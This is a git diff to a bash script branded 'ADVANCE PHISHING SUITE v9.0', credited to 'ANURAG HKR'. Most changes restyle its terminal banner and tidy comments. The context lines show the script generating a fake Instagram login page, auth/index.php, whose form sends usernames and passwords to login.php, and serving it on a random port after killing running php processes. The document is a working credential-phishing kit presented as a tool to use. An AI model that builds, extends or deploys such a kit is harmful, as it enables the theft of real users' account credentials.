@@ -12,7 +12,9 @@ BLUE='\033[1;34m'
 CYAN='\033[1;36m'
 YELLOW='\033[1;33m'
 PURPLE='\033[1;35m'
+WHITE='\033[1;37m'
 RESET='\033[0m'
+BOLD='\033[1m'
 
 # Cleanup Old
 pkill -f php > /dev/null 2>&1
@@ -34,26 +36,31 @@ else
     RUNNER=""
 fi
 
-# RANDOM PORT GENERATOR (The Fix)
+# RANDOM PORT GENERATOR
 PORT=$((4000 + RANDOM % 5000))
 
-# --- 3. ADVANCE BANNER (ANURAG HKR - RED EDITION) ---
+# --- 3. ULTRA PREMIUM BANNER (ANURAG HKR - BLOCK STYLE) ---
 clear
-# Yahan color ko RED kar diya hai taaki naam Lal dikhe
-echo -e "${RED}"
-cat << "EOF"
-    _    _   _ _   _ ____       _    ____    _   _ _   _______ 
-   / \  | \ | | | | |  _ \     / \  / ___|  | | | | |/ /  _ \ 
-  / _ \ |  \| | | | | |_) |   / _ \| |  _    | |_| | ' /| |_) |
- / ___ \| |\  | |_| |  _ <   / ___ \ |_| |  |  _  | . \|  _ < 
-/_/   \_\_| \_|\___/|_| \_\/_/   \_\____|  |_| |_|_|\_\_| \_\
-                                                              
-EOF
-echo -e "${RESET}"
-echo -e "${PURPLE}      >>> ADVANCE PHISHING SUITE v9.0 <<<        ${RESET}"
-# Yahan bhi naam ko RED highlight kiya hai
-echo -e "${YELLOW}      >>>  CREATED BY : ${RED}ANURAG HKR${YELLOW}    <<<        ${RESET}"
-echo -e "${CYAN}====================================================${RESET}"
+echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${RESET}"
+echo -e "${CYAN}║                                                              ║${RESET}"
+echo -e "${RED}║   █████╗ ███╗   ██╗██╗   ██╗██████╗  █████╗  ██████╗         ║${RESET}"
+echo -e "${RED}║   ██╔══██╗████╗  ██║██║   ██║██╔══██╗██╔══██╗██╔════╝        ║${RESET}"
+echo -e "${RED}║   ███████║██╔██╗ ██║██║   ██║██████╔╝███████║██║  ███╗       ║${RESET}"
+echo -e "${RED}║   ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║██║   ██║       ║${RESET}"
+echo -e "${RED}║   ██║  ██║██║ ╚████║╚██████╔╝██║  ██║██║  ██║╚██████╔╝       ║${RESET}"
+echo -e "${RED}║   ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝        ║${RESET}"
+echo -e "${RED}║           ██╗  ██╗██╗  ██╗██████╗                            ║${RESET}"
+echo -e "${RED}║           ██║  ██║██║ ██╔╝██╔══██╗                           ║${RESET}"
+echo -e "${RED}║           ███████║█████╔╝ ██████╔╝                           ║${RESET}"
+echo -e "${RED}║           ██╔══██║██╔═██╗ ██╔══██╗                           ║${RESET}"
+echo -e "${RED}║           ██║  ██║██║  ██╗██║  ██║                           ║${RESET}"
+echo -e "${RED}║           ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                           ║${RESET}"
+echo -e "${CYAN}║                                                              ║${RESET}"
+echo -e "${CYAN}╠══════════════════════════════════════════════════════════════╣${RESET}"
+echo -e "${CYAN}║${PURPLE}         >>> ADVANCE PHISHING SUITE v9.0 <<<                  ${CYAN}║${RESET}"
+echo -e "${CYAN}║${YELLOW}         >>> CREATED BY : ${RED}${BOLD}ANURAG HKR${RESET}${YELLOW} <<<                      ${CYAN}║${RESET}"
+echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${RESET}"
+echo ""
 echo -e "${GREEN}[+] System Assigned Port : ${RED}$PORT ${GREEN}(Safe Mode)${RESET}"
 echo ""
 
@@ -70,7 +77,7 @@ cat > auth/index.php <<EOF
 body{ background:#0b1116; color:#fff; }
 .main{ display:flex; min-height:100vh; }
 
-/* DESKTOP STYLES (Your Original Design) */
+/* DESKTOP STYLES */
 .left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
 .left img.logo{ width:55px; margin-bottom:40px; }
 .left h1{ font-size:40px; font-weight:400; line-height:1.3; }
@@ -86,7 +93,7 @@ body{ background:#0b1116; color:#fff; }
 .new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; }
 .meta{ text-align:center; margin-top:25px; opacity:.7; }
 
-/* MOBILE FIX (Responsive) */
+/* MOBILE FIX */
 @media(max-width:900px){
     .main{ flex-direction:column; }
     .left{ display:none; } 
@@ -109,13 +116,11 @@ body{ background:#0b1116; color:#fff; }
         <div class="card">
             <img class="mobile-logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
             <h2 style="font-family: sans-serif;">Instagram</h2>
-            
             <form action="login.php" method="POST">
                 <input class="input" type="text" name="u" placeholder="Mobile number, username or email address" required>
                 <input class="input" type="password" name="p" placeholder="Password" required>
                 <button class="btn" type="submit">Log in</button>
             </form>
-
             <div class="link">Forgotten password?</div>
             <button class="fb">Log in with Facebook</button>
             <button class="new">Create new account</button>
